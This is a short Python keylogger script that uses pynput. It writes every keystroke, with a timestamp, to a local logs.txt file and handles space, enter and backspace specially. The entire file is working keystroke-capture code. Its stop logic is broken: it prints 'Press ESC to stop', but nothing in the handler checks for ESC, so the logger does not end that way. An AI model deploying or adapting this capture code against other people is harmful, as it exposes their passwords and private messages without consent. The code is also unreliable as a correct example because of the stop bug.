from pynput import keyboard
from datetime import datetime

LOG_FILE = "logs.txt"

def write_log(key):
    key = str(key).replace("'", "")

    with open(LOG_FILE, "a") as f:
        if "Key.space" in key:
            f.write(" ")
        elif "Key.enter" in key:
            f.write("\n")
        elif "Key.backspace" in key:
            f.write("[BACKSPACE]")
        elif "Key.shift" in key or "Key.ctrl" in key:
            pass
        else:
            f.write(key)

def on_press(key):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
    with open(LOG_FILE, "a") as f:
        f.write(timestamp)

    write_log(key)

def start_logger():
    print("Keylogger started... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()